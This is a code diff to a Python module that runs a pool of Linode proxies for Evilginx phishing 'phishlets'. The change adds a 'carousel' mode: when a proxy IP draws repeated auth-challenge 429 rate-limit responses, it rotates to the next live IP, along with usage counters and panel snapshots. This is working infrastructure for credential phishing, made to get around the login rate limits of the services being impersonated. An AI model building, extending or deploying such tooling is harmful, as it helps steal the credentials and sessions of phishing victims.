@@ -24,13 +24,13 @@ IMAGE = "linode/ubuntu22.04"
 PLAN = "g6-nanode-1"
 
 _lock = threading.RLock()
+_used_lock = threading.Lock()
 _settings_path = None
 _phishlets_dir = None
 _egx_config_path = None
 _notify = None  # fn(title, message, ntype)
 _used_mem = {}
 _used_dirty = False
-_used_flushed = 0.0
 _tunnels = []
 _tunnels_lock = threading.Lock()
 
@@ -45,6 +45,7 @@ def init(settings_path, phishlets_dir, egx_config_path, notify_fn):
         _used_mem = dict((load().get("used_by") or {}))
     except Exception:
         _used_mem = {}
+    threading.Thread(target=_used_flush_loop, daemon=True).start()
 
 
 def _empty():
@@ -53,6 +54,7 @@ def _empty():
         "proxies": [],
         "assignments": {},
         "current": {},
+        "carousel": {},
         "hits": {},
         "used_by": {},
         "deploy": {"running": False, "step": "", "pct": 0, "error": ""},
@@ -478,31 +480,38 @@ def _used_slot(px_id, phishlet):
     return slot
 
 
-def _flush_used(force=False):
-    global _used_dirty, _used_flushed
-    if not _used_dirty:
-        return
-    now = time.time()
-    if not force and now - _used_flushed < 5:
-        return
+def _used_flush_loop():
+    while True:
+        time.sleep(5)
+        try:
+            _flush_used()
+        except Exception:
+            pass
+
+
+def _flush_used():
+    """Persist counters to disk. Never called from the CONNECT pump."""
+    global _used_dirty
+    with _used_lock:
+        if not _used_dirty:
+            return
+        snap = json.loads(json.dumps(_used_mem))
+        _used_dirty = False
     with _lock:
         s = load()
-        s["used_by"] = json.loads(json.dumps(_used_mem))
+        s["used_by"] = snap
         save(s)
-        _used_flushed = now
-        _used_dirty = False
 
 
 def _note_use(px_id, phishlet):
     global _used_dirty
     if not px_id or not phishlet:
         return
-    with _lock:
+    with _used_lock:
         slot = _used_slot(px_id, phishlet)
         slot["hits"] = int(slot.get("hits") or 0) + 1
         slot["last"] = int(time.time())
         _used_dirty = True
-        _flush_used()
 
 
 def _add_bytes(px_id, phishlet, n_out=0, n_in=0):
@@ -513,17 +522,29 @@ def _add_bytes(px_id, phishlet, n_out=0, n_in=0):
     n_in = int(n_in or 0)
     if n_out <= 0 and n_in <= 0:
         return
-    with _lock:
+    with _used_lock:
         slot = _used_slot(px_id, phishlet)
         slot["bytes_out"] = int(slot.get("bytes_out") or 0) + n_out
         slot["bytes_in"] = int(slot.get("bytes_in") or 0) + n_in
         slot["last"] = int(time.time())
         _used_dirty = True
-        _flush_used()
+
+
+def _live_assigned_ids(s, assigned):
+    live = []
+    for i in assigned or []:
+        rec = next((p for p in s.get("proxies") or [] if _as_id(p.get("id")) == i), None)
+        if rec and rec.get("status") == "active" and rec.get("ipv4"):
+            live.append(i)
+    return live
 
 
 def record_auth_429(phishlet, host="", path=""):
-    """Count only auth-challenge 429s. Never destroys a Linode. Never detaches a proxy that is not live."""
+    """Count only auth-challenge 429s. Never destroys a Linode. Never detaches a proxy that is not live.
+
+    Carousel (per phishlet): after HIT_LIMIT, current hop goes to the end of the
+    assignment queue and stays assigned. Off: current hop is detached from the phishlet.
+    """
     with _lock:
         s = load()
         pl = phishlet or domain_to_phishlet(host)
@@ -543,6 +564,45 @@ def record_auth_429(phishlet, host="", path=""):
             return {"ok": True, "hits": len(hits), "limit": HIT_LIMIT}
 
         assigned = [_as_id(i) for i in (s.get("assignments") or {}).get(pl) or []]
+        carousel = bool((s.get("carousel") or {}).get(pl))
+        ip = rec.get("ipv4") or str(px_id)
+
+        if carousel:
+            if px_id in assigned:
+                assigned = [i for i in assigned if i != px_id] + [px_id]
+            s.setdefault("assignments", {})[pl] = assigned
+            live = _live_assigned_ids(s, assigned)
+            nxt = next((i for i in live if i != px_id), None)
+            if nxt is None:
+                nxt = live[0] if live else None
+            s.setdefault("current", {})[pl] = nxt
+            s["hits"][key] = []
+            save(s)
+            if nxt and nxt != px_id:
+                drop_proxy_tunnels([px_id])
+            nxtp = next((p for p in s["proxies"] if _as_id(p.get("id")) == nxt), None) if nxt else None
+            nxt_ip = (nxtp or {}).get("ipv4") or nxt
+            if _notify:
+                if nxt and nxt != px_id:
+                    _notify(
+                        "Proxy carousel",
+                        f"Phishlet {pl}: {ip} hit {HIT_LIMIT} auth-429 in {HIT_WINDOW//60}m. Moved to end of queue (still assigned). Now using {nxt_ip}.",
+                        "warning",
+                    )
+                elif nxt == px_id:
+                    _notify(
+                        "Proxy carousel",
+                        f"Phishlet {pl}: {ip} hit {HIT_LIMIT} auth-429 in {HIT_WINDOW//60}m. No other live hop in the queue — staying on {ip}.",
+                        "warning",
+                    )
+                else:
+                    _notify(
+                        "Proxy pool empty",
+                        f"Phishlet {pl}: no live assigned proxies. Traffic uses the Evilginx server IP.",
+                        "error",
+                    )
+            return {"ok": True, "rotated": True, "carousel": True, "detached": None, "previous": px_id, "next": nxt}
+
         if px_id in assigned:
             assigned.remove(px_id)
         s.setdefault("assignments", {})[pl] = assigned
@@ -552,8 +612,6 @@ def record_auth_429(phishlet, host="", path=""):
         save(s)
         drop_proxy_tunnels([px_id])
 
-        dead = rec
-        ip = (dead or {}).get("ipv4") or str(px_id)
         if _notify:
             if nxt:
                 nxtp = next((p for p in s["proxies"] if _as_id(p.get("id")) == nxt), None)
@@ -568,7 +626,7 @@ def record_auth_429(phishlet, host="", path=""):
                     f"Phishlet {pl}: all assigned proxies exhausted. Traffic uses the Evilginx server IP.",
                     "error",
                 )
-        return {"ok": True, "rotated": True, "detached": px_id, "next": nxt}
+        return {"ok": True, "rotated": True, "carousel": False, "detached": px_id, "next": nxt}
 
 
 def ensure_evilginx_sidecar_proxy():
@@ -608,25 +666,74 @@ def public_state():
         pid = _as_id(p.get("id"))
         q["id"] = pid
         q["assigned_phishlets"] = list(assigned_rev.get(pid) or [])
-        used = (
-            _used_mem.get(str(pid))
-            or _used_mem.get(str(p.get("id")))
-            or (s.get("used_by") or {}).get(str(pid))
-            or (s.get("used_by") or {}).get(str(p.get("id")))
-            or {}
-        )
-        q["used_by"] = used
+        with _used_lock:
+            used = (
+                _used_mem.get(str(pid))
+                or _used_mem.get(str(p.get("id")))
+                or (s.get("used_by") or {}).get(str(pid))
+                or (s.get("used_by") or {}).get(str(p.get("id")))
+                or {}
+            )
+            q["used_by"] = json.loads(json.dumps(used))
         proxies.append(q)
     return {
         "configured": bool(s.get("api_key")),
         "proxies": proxies,
         "assignments": s.get("assignments") or {},
         "current": s.get("current") or {},
+        "carousel": s.get("carousel") or {},
         "deploy": s.get("deploy") or {},
         "allow_ip": public_ipv4(),
         "plan": PLAN,
         "image": IMAGE,
     }
+
+
+def live_snapshot():
+    """RAM snapshot for the panel UI. No Linode API, no Evilginx, no disk I/O on the hot path."""
+    s = load()
+    with _used_lock:
+        used = json.loads(json.dumps(_used_mem or s.get("used_by") or {}))
+    slim = []
+    for p in s.get("proxies") or []:
+        slim.append({
+            "id": _as_id(p.get("id")),
+            "ipv4": p.get("ipv4") or "",
+            "label": p.get("label") or "",
+            "status": p.get("status") or "",
+        })
+    return {
+        "used_by": used,
+        "assignments": s.get("assignments") or {},
+        "current": s.get("current") or {},
+        "carousel": s.get("carousel") or {},
+        "proxies": slim,
+        "deploy_running": bool((s.get("deploy") or {}).get("running")),
+    }
+
+
+def live_fingerprint(snap):
+    parts = []
+    for pid, rec in sorted((snap.get("used_by") or {}).items(), key=lambda x: str(x[0])):
+        for pl, sl in sorted((rec or {}).items(), key=lambda x: str(x[0])):
+            sl = sl or {}
+            parts.append(
+                f"{pid}:{pl}:{int(sl.get('hits') or 0)}:{int(sl.get('bytes_out') or 0)}:{int(sl.get('bytes_in') or 0)}"
+            )
+    parts.append(json.dumps(snap.get("assignments") or {}, sort_keys=True, separators=(",", ":")))
+    parts.append(json.dumps(snap.get("current") or {}, sort_keys=True, separators=(",", ":")))
+    parts.append(json.dumps({k: bool(v) for k, v in (snap.get("carousel") or {}).items()}, sort_keys=True, separators=(",", ":")))
+    parts.append(",".join(str(p.get("id")) for p in snap.get("proxies") or []))
+    return "|".join(parts)
+
+
+def set_carousel(phishlet, enabled):
+    """Per-phishlet 429 mode: True = round-robin without detach."""
+    with _lock:
+        s = load()
+        s.setdefault("carousel", {})[phishlet] = bool(enabled)
+        save(s)
+    return public_state()
 
 
 def assign(phishlet, linode_ids):
@@ -1159,7 +1266,7 @@ class _Sidecar(threading.Thread):
             def flush_bytes(force=False):
                 with acc_lock:
                     now = time.time()
-                    if not force and now - acc["t"] < 2:
+                    if not force and now - acc["t"] < 1:
                         return
                     n_out, n_in = acc["out"], acc["in"]
                     acc["out"] = acc["in"] = 0
